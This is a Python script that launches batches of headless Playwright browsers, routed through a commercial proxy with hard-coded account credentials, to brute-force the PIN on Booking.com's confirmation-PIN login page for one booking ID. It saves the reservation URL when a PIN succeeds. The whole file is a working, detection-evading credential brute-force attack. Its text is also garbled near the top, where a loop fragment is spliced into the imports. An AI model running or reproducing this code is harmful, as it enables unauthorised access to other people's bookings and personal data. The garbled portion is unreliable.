#!/usr/bin/env python3
"""
⚡ STEALTH ARMY LAUNCHER - Maximum Efficiency 
Uses headless browsers for minimal RAM usage
"""

import subprocess
import os
import time
import sys
import psutil
from pathlib import Path
from datetime import datetime
    for batch_num, pin_batch in enumerate(batches, 1):
        batch_info = f"Agents 1-53" if batch_num == 1 else f"Agents 54-{len(pin_list)}"
        print(f"\n{Fore.MAGENTA}🥷 STEALTH BATCH #{batch_num}/2 ({batch_info}) - {len(pin_batch)} PINs{Style.RESET_ALL}")om colorama import Fore, Style, init

init(autoreset=True)

# Configuration
BOOKING_ID = "5724349472"
PYTHON_PATH = sys.executable
BASE_DIR = Path(".")
MAX_AGENTS = 106

# Aggressive resource optimization
TOTAL_RAM_GB = psutil.virtual_memory().total / (1024**3)
AVAILABLE_RAM_GB = psutil.virtual_memory().available / (1024**3)

# Custom batch size: 2 batches of 53 agents each
STEALTH_BATCH_SIZE = 53  # Exactly 53 headless browsers per batch

def display_stealth_banner():
    """Display the stealth deployment banner"""
    banner = f"""
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    ⚡ STEALTH ARMY - MAXIMUM EFFICIENCY ⚡                   ║
║                                                                              ║
║  🥷 STEALTH MODE:                                                            ║
║     • Headless browsers (invisible)                                         ║
║     • ~50MB RAM per browser (vs 250MB)                                      ║
║     • {STEALTH_BATCH_SIZE} agents per batch (2 batches total)                        ║
║     • Ultra-fast deployment                                                 ║
║                                                                              ║
║  📊 YOUR SYSTEM:                                                             ║
║     • Total RAM: {TOTAL_RAM_GB:.1f} GB                                                   ║
║     • Available: {AVAILABLE_RAM_GB:.1f} GB                                               ║
║     • Estimated usage: ~{STEALTH_BATCH_SIZE * 0.05:.1f} GB per batch                          ║
║                                                                              ║
║                      🚀 STEALTH DEPLOYMENT READY! 🚀                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def create_stealth_agent_launcher():
    """Create a stealth version of agents that run headless"""
    stealth_script = f'''#!/usr/bin/env python3
"""
🥷 STEALTH RAPID-FIRE AGENT - Headless & Fast
Tests multiple PINs with minimal resource usage
"""

from playwright.sync_api import sync_playwright
import sys
import time
from datetime import datetime

# Get PIN from command line
if len(sys.argv) != 2:
    print("Usage: python stealth_agent.py <PIN>")
    sys.exit(1)

ASSIGNED_PIN = sys.argv[1]
BOOKING_ID = "{BOOKING_ID}"

# Lightweight proxy configuration
PROXY_CONFIG = {{
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}}

def test_pin_stealth():
    """Ultra-lightweight PIN testing"""
    try:
        with sync_playwright() as p:
            # Launch headless browser (much less RAM)
            browser = p.chromium.launch(
                headless=True,  # Invisible = less RAM
                proxy=PROXY_CONFIG,
                args=['--no-sandbox', '--disable-dev-shm-usage']  # Extra memory savings
            )
            page = browser.new_page()
            
            # Navigate and test
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="load", timeout=20000)
            
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=10000)
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            page.fill('input[placeholder="e.g. 1234"]', ASSIGNED_PIN)
            
            # Submit
            try:
                page.click('button:has-text("Continue")')
            except:
                page.click('button[type="submit"]')
            
            # Wait for result
            page.wait_for_function(
                '''() => location.href.includes('unique_order_id') || 
                        document.querySelector('.bui-alert--error') !== null''',
                timeout=20000
            )
            
            current_url = page.url
            
            if "unique_order_id=" in current_url:
                # SUCCESS!
                success_msg = f"STEALTH_SUCCESS|PIN_{ASSIGNED_PIN}|{{current_url}}|{{datetime.now()}}"
                print(success_msg)
                
                # Write success file
                with open("../STEALTH_SUCCESS.txt", "w") as f:
                    f.write(success_msg)
                
                browser.close()
                return True
            else:
                print(f"STEALTH_FAIL|PIN_{ASSIGNED_PIN}")
                browser.close()
                return False
                
    except Exception as e:
        print(f"STEALTH_ERROR|PIN_{ASSIGNED_PIN}|{{str(e)}}")
        return False

if __name__ == "__main__":
    result = test_pin_stealth()
    sys.exit(0 if result else 1)
'''
    
    with open("stealth_agent.py", "w", encoding="utf-8") as f:
        f.write(stealth_script)
    
    print(f"{Fore.GREEN}✅ Stealth agent script created{Style.RESET_ALL}")

def launch_stealth_batch(pin_list):
    """Launch a batch of stealth agents"""
    processes = []
    
    print(f"\n{Fore.YELLOW}🥷 Launching stealth batch: {len(pin_list)} agents{Style.RESET_ALL}")
    
    for pin in pin_list:
        try:
            process = subprocess.Popen(
                [PYTHON_PATH, "stealth_agent.py", pin],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            processes.append((pin, process))
            print(f"{Fore.GREEN}✅ Stealth Agent PIN {pin}: Launched{Style.RESET_ALL}")
            time.sleep(0.2)  # Very small delay
            
        except Exception as e:
            print(f"{Fore.RED}❌ Stealth Agent PIN {pin}: Failed - {e}{Style.RESET_ALL}")
    
    return processes

def monitor_stealth_batch(processes):
    """Monitor stealth batch for results"""
    print(f"\n{Fore.CYAN}🔍 Monitoring {len(processes)} stealth agents...{Style.RESET_ALL}")
    
    completed = 0
    success_found = False
    
    while completed < len(processes) and not success_found:
        # Check for success file
        success_file = BASE_DIR / "STEALTH_SUCCESS.txt"
        if success_file.exists():
            print(f"\n{Fore.GREEN}{Style.BRIGHT}🎉 STEALTH SUCCESS DETECTED!{Style.RESET_ALL}")
            success_found = True
            break
        
        # Check individual processes
        for i, (pin, process) in enumerate(processes):
            if process and process.poll() is not None:
                stdout, stderr = process.communicate()
                completed += 1
                
                if "STEALTH_SUCCESS" in stdout:
                    success_found = True
                    print(f"\n{Fore.GREEN}{Style.BRIGHT}🎉 Stealth Agent PIN {pin} FOUND SUCCESS!{Style.RESET_ALL}")
                    break
                elif "STEALTH_FAIL" in stdout:
                    print(f"{Fore.BLUE}Stealth Agent PIN {pin}: Failed{Style.RESET_ALL}")
                
                processes[i] = (pin, None)
        
        if not success_found:
            time.sleep(1)  # Quick check interval
    
    # Terminate remaining
    for pin, process in processes:
        if process and process.poll() is None:
            try:
                process.terminate()
            except:
                pass
    
    return success_found

def main():
    """Main stealth deployment"""
    display_stealth_banner()
    
    # Get all PINs from agent folders
    pin_list = []
    for i in range(1, MAX_AGENTS + 1):
        agent_dir = BASE_DIR / f"agent_{i:03d}"
        main_py_path = agent_dir / "main.py"
        
        if main_py_path.exists():
            try:
                with open(main_py_path, "r", encoding="utf-8") as f:
                    content = f.read()
                    for line in content.split('\\n'):
                        if line.strip().startswith('ASSIGNED_PIN = "'):
                            pin = line.strip().split('"')[1]
                            pin_list.append(pin)
                            break
            except:
                pass
    
    print(f"{Fore.CYAN}📋 STEALTH DEPLOYMENT PLAN:")
    print(f"   • Total PINs to test: {len(pin_list)}")
    print(f"   • Batch size: {STEALTH_BATCH_SIZE} agents per batch")
    print(f"   • Total batches: 2 (Batch 1: 53 agents, Batch 2: {len(pin_list)-53} agents)")
    print(f"   • Estimated RAM usage: ~{STEALTH_BATCH_SIZE * 0.05:.1f} GB per batch")
    print(f"   • Mode: Headless (invisible browsers){Style.RESET_ALL}")
    
    input(f"\\n{Fore.CYAN}Press ENTER to deploy stealth army...{Style.RESET_ALL}")
    
    # Create stealth agent
    create_stealth_agent_launcher()
    
    # Create batches
    batches = [pin_list[i:i + STEALTH_BATCH_SIZE] for i in range(0, len(pin_list), STEALTH_BATCH_SIZE)]
    
    print(f"\\n{Fore.GREEN}🥷 DEPLOYING STEALTH ARMY...{Style.RESET_ALL}")
    start_time = time.time()
    
    for batch_num, pin_batch in enumerate(batches, 1):
        print(f"\\n{Fore.MAGENTA}🥷 STEALTH BATCH #{batch_num}/{len(batches)}{Style.RESET_ALL}")
        
        # Launch stealth batch
        batch_processes = launch_stealth_batch(pin_batch)
        
        # Monitor for success
        success_found = monitor_stealth_batch(batch_processes)
        
        if success_found:
            print(f"\\n{Fore.GREEN}{Style.BRIGHT}🏆 STEALTH MISSION ACCOMPLISHED!{Style.RESET_ALL}")
            break
        
        # Brief pause between batches
        if batch_num < len(batches):
            time.sleep(2)
    
    # Results
    end_time = time.time()
    total_time = end_time - start_time
    
    success_file = BASE_DIR / "STEALTH_SUCCESS.txt"
    if success_file.exists():
        try:
            with open(success_file, "r") as f:
                success_data = f.read().strip()
            print(f"\\n{Fore.GREEN}{Style.BRIGHT}🎉 STEALTH SUCCESS: {success_data}{Style.RESET_ALL}")
        except:
            print(f"\\n{Fore.GREEN}🎉 STEALTH SUCCESS! Check STEALTH_SUCCESS.txt{Style.RESET_ALL}")
    else:
        print(f"\\n{Fore.YELLOW}🥷 Stealth deployment complete - no success found{Style.RESET_ALL}")
    
    print(f"\\n{Fore.CYAN}📊 STEALTH STATS:")
    print(f"• Total time: {total_time:.1f} seconds")
    print(f"• PINs tested: {len(pin_list)}")
    print(f"• Stealth batches: {len(batches)}")
    print(f"• Final RAM: {psutil.virtual_memory().percent:.1f}%{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
